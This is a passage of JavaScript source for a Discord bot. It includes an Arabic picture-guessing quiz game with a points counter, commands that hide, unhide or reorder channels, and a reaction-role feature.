             "type": "https://cdn.discordapp.com/attachments/429330153735454722/429933059278635028/204ba71fbee91a03.png",
         "answers": ["الأوسكار"]
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/430040573269901332/3333333.png",
         "answers": ["كنت امشي وأمشي"]
  
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/430040585357754368/3333333.png",
         "answers": ["لااااق بوتء"]
  
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/430040593595629568/3333333.png",
         "answers": ["ابو ناصر سرى ليله"]
  
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/430040602235895810/fghfghfgh.png",
         "answers": ["عدد اللي برمجوني 2"]
  
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/430040608825147412/hhhhyyrf87654.png",
         "answers": ["Dark_Neet"]
  
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/430040611819749387/354d9e28fd1264f5.png",
         "answers": ["بابا سنفور متعاطي"]
  
               },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/430040619331878922/4b24f4792476c04f.png",
         "answers": ["ميرندا حمضيات يلد"]
  
               },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/430040624603987968/5ff29b1066a3b9c7.png",
         "answers": ["هل الدمع من عينه"]
  
               },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/430040631885299722/77f33951be682d8f.png",
         "answers": ["طارت الطياره طارت"]
  
               },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/430040640928219136/29c240679c04c148.png",
         "answers": ["أنا فوق راسي ريشه"]
  
               },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/430040652542246912/bbcb4aa9853bf1d2.png",
         "answers": ["فريق النجمة"]
  
               },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/430040659437813780/69df1a1ea78bf05c.png",
         "answers": ["خالد عبدالرحمن"]
  
               },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/430040666895024128/8bc7742b95673c38.png",
         "answers": ["حبيت مره من قلبي"]
  
               },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/430040674067546113/9d1a9eee36622271.png",
         "answers": ["كرستيانو يزق"]
  
               },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/430040682913333248/f19a97c10ac739e1.png",
         "answers": ["أنت قمر يا قمر"]
  
               },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/430040692140539904/0a25039aa164a42b.png",
         "answers": ["انا اجمل مخلوق"]
  
               },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/430040699317256192/da72e3e3fe6bfceb.png",
         "answers": ["دونت تاتش"]
  
               },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/430040706464350218/d6339ed123a20afe.png",
         "answers": ["توم وجيري"]
  
               },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/430040714588454912/965f8266e9501b35.png",
         "answers": ["دباب اربع كفرات"]
  
               },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/430040721601331211/ae8cf2598c441e76.png",
         "answers": ["القرش الأسودد"]
  
               },
     {
    
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/430040729637748747/bf76692d54e6a0dd.png",
         "answers": ["ددسن موديل 85"]
  
     },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/430040736835043341/e66ff909a6330b13.png",
         "answers": ["الحارثيء"]
  
     },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/430040746503176194/351af3b19fc53323.png",
         "answers": ["عزازي مسرع"]
  
     },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/430040751557181440/6777776666.png",
         "answers": ["جاكي شاان"]
  
     },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/430040758108684289/2613844efcb8b05b.png",
         "answers": ["دارك نت"]
  
     },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/430040765671014401/c89aa167715a85b9.png",
         "answers": ["فانتاستيك"]
  
     },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/430040772818239489/01d73182b48785e1.png",
         "answers": ["زباله متنقلة"]
  
     },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/430040778467835924/9dff572a5bf1b602.png",
         "answers": ["اكس بوكس يلد"]
  
         },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/430040783228370964/91ebb70e0dd936be.png",
         "answers": ["بكسل يالوصخخ"]
 
     }
 ];
  
 client.on('message', message => {
 if (!points[message.author.id]) points[message.author.id] = {
     points: 0,
   };
   if(!message.guild) return;
     let id = message.author.id,prefix="-";
     if (spee[id] && (new Date).getTime() - spee[id] < 15*1000) {
         let r = (new Date).getTime() - spee[id];
         r = 15*1000 - r;
     message.channel.send(`**Sorry, Please Wait ${pretty(r, {verbose:true})}...**`).then(m => m.delete(5000));
     return;
     }
     if ( message.content == prefix+'rgz'){
        
         try{
 }catch(e){
  
 }
  
     if(!message.channel.guild) return message.reply('**هذا الأمر للسيرفرات فقط**').then(m => m.delete(3000));
  
  
 const item = type[Math.floor(Math.random() * type.length)];
 const filter = response => {  
     return item.answers.some(answer => answer.toLowerCase() === response.content.toLowerCase());
 };
 message.channel.send('**Game is Start now...!**').then(msg => {
  
  const embed = new Discord.RichEmbed()
  .setColor("0054dd")
      .setAuthor(`⏳ |You have »15« seconds to type the word`)
           .setImage(`${item.type}`)
  .setFooter(`${message.author.tag}`, message.author.avatarURL)
  
  
          
 msg.channel.send(embed).then(() => {
         message.channel.awaitMessages(filter, { maxMatches: 1, time: 15000, errors: ['time'] })
         .then((collected) => {
                   const sh = new Discord.RichEmbed()
   .setColor("04791c")
   .setDescription('**✅ |Good Job +1P**')
    .setFooter(`${collected.first().author}`)
   message.channel.sendEmbed(sh);
             let won = collected.first().author; // في هذا السطر يقوم الكود بسحب الأي دي الذي قام بالأجابة اولاً
             points[won.id].points++;
           })
           .catch(collected => { // في حال لم يقم أحد بالإجابة
             message.channel.send(`🔚 |**Time Is End**`);
           })
         })
     })
     spee[id] = (new Date).getTime()
 }
 });


client.on("message", (message) => {
    const command = message.content.split(" ")[0];
    const args = message.content.split(" ").slice();
  if(command === "_tl3"){
            let member = message.mentions.users.first(); 
    if(typeof args[1] !== "number")
message.channel.setPosition(args[1]).then(c => {
    message.channel.send("ok");
});
}
});


client.on('message', msg => {
  if(msg.content === '_hide') {
    msg.guild.channels.forEach(c => {
      c.overwritePermissions(msg.guild.id, {
        SEND_MESSAGES: false,
        READ_MESSAGES: false
      })
    })
    msg.channel.send('.')
  }
})


client.on('message', msg => {
  if(msg.content === '_unhide') {
    msg.guild.channels.forEach(c => {
      c.overwritePermissions(msg.guild.id, {
        SEND_MESSAGES: true,
        READ_MESSAGES: true
      })
    })
    msg.channel.send('.')
  }
})

 
var stopReacord = true;
var reactionRoles = [];
var definedReactionRole = null;
 
client.on("message", async message => {
    const args = message.content.slice(prefix.length).trim().split(/ +/g);
    const command = args.shift().toLowerCase();
    if(message.author.bot) return;
    if(message.content.indexOf(prefix) !== 0) return;
    if (command == "autoc") {
      if(!message.channel.guild) return message.reply(`**this ~~command~~ __for servers only__**`);
      if(!message.member.hasPermission("ADMINISTRATOR")) return message.channel.send("sorry you can't do this");
      if(!args[0] || args[1]) return message.channel.send(`\`\`\`${prefix}autoC <role-name>\`\`\``);
      var role = message.guild.roles.find( role => { return role.name == args[0] });
      if(!role) return message.channel.send(`no role with name ${definedRoleName} found, make sure you entered correct name`);
      if(definedReactionRole != null  || !stopReacord) return message.channel.send("another reaction role request is running");
      message.channel.send(`now go and add reaction in the message you want for role ${role.name}`);
      definedReactionRole = role;
      stopReacord = false;
    }    
})
client.on('raw', raw => {
  if (!['MESSAGE_REACTION_ADD', 'MESSAGE_REACTION_REMOVE'].includes(raw.t)) return;
  var channel = client.channels.get(raw.d.channel_id);
  if (channel.messages.has(raw.d.message_id)) return;
  channel.fetchMessage(raw.d.message_id).then(message => {
    var reaction = message.reactions.get( (raw.d.emoji.id ? `${raw.d.emoji.name}:${raw.d.emoji.id}` : raw.d.emoji.name) );
    if (raw.t === 'MESSAGE_REACTION_ADD') return client.emit('messageReactionAdd', reaction, client.users.get(raw.d.user_id));
    if (raw.t === 'MESSAGE_REACTION_REMOVE') return client.emit('messageReactionRemove', reaction, client.users.get(raw.d.user_id));
  });
});
client.on('messageReactionAdd', (reaction, user) => {
    if(user.id == client.user.id) return;
    if(!stopReacord) {
      var done = false;
      reactionRoles[reaction.message.id] = { role: definedReactionRole, message_id: reaction.message.id, emoji: reaction.emoji};
      stopReacord =  true;
      definedReactionRole = null;
      reaction.message.react(reaction.emoji.name)
      .catch(err => {done = true; reaction.message.channel.send(`sorry i can't use this emoji but the reaction role done! anyone react will get the role!`)})
      if(done) reaction.remove(user);
    } else {
      var request = reactionRoles[reaction.message.id];
      if(!request) return;
      if(request.emoji.name != reaction.emoji.name) return reaction.remove(user);
      reaction.message.guild.members.get(user.id).addRole(request.role);
    }
})
client.on('messageReactionRemove', (reaction, user) => {
  if(user.id == client.user.id) return;
  if(!stopReacord) return;
  let request = reactionRoles[reaction.message.id];
  if(!request) return;
  reaction.message.guild.members.get(user.id).removeRole(request.role);
});



client.login(process.env.BOT_TOKEN);
